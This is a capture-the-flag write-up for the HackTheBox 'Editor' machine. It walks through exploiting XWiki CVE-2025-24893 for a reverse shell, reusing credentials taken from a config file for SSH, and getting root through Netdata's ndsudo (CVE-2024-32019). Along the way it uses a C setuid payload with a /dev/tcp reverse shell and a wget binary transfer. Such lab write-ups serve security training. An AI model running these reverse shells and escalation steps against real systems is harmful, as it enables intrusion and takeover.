## HackTheBox – [Editor](https://app.hackthebox.com/machines/Editor) (Writeup)

## Scanning
We begin with a full TCP scan:

```python
nmap -sC -sV -p- -T4 10.10.11.80
```
Open ports:

* 80/tcp – HTTP
* 22/tcp – SSH
* 8080/tcp – HTTP

The website uses virtual hosts, so we add entries to ```/etc/hosts```:

```python
echo "10.10.11.80 wiki.editor.htb editor.htb" | sudo tee -a /etc/hosts
```
## Initial Foothold

Browsing ```wiki.editor.htb:8080``` shows a documentation page powered by XWiki.

At the bottom, we see the version: `XWiki Debian 15.10.8`.

A quick search reveals a known vulnerability: `CVE-2025-24893`.

We exploit it to gain RCE and establish a reverse shell:

[CVE-2024-24893](https://github.com/gunzf0x/CVE-2025-24893/blob/main/CVE-2024-24893.py)

```python
nc -lvnp 9001
python3 CVE-2025-24893.py -t 'http://10.10.11.80:8080' -c 'busybox nc 10.10.10.10 9001 -e /bin/bash'
```
We successfully get a shell as the xwiki user.

## Privilege Escalation – User

Checking `/home`, we find a user oliver.

After some enumeration, an interesting file appears at:

```python
/etc/xwiki/hibernate.cfg.xml
```
Inside we find database credentials:

```python
<property name="hibernate.connection.username">xwiki</property>
<property name="hibernate.connection.password">*********</property>
```
We reuse these credentials for SSH:

```python
ssh oliver@10.10.11.80
```
Now we can read ```user.txt```.

## Privilege Escalation – Root

```sudo -l``` doesn’t give anything useful, so we continue manual enumeration.

Running ```netstat -ntul``` reveals Netdata listening on a local port.

We port-forward it:

```python
ssh -L 19999:127.0.0.1:19999 oliver@10.10.11.80
```
Opening ```http://127.0.0.1:19999``` on our machine, we see an outdated `Netdata` version vulnerable to ```CVE-2024-32019```.

We use a public PoC exploit in C:

```python
#include <unistd.h>  // for setuid, setgid, execl
#include <stddef.h>  // for NULL

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/YOUR IP/YOUR PORT 0>&1", NULL);
    return 0;
}
```
```python
x86_64-linux-gnu-gcc -o nvme exploit.c -static
```
Transfer the binary to the target:

```python
# Attacker
python3 -m http.server

# Target
wget http://10.10.10.10:8000/nvme
chmod +x nvme
```
Set up a listener:
```python
nc -lvnp 4444
```
Execute the exploit via the vulnerable Netdata plugin:

```python
PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```
We pop a root shell and retrieve root.txt.
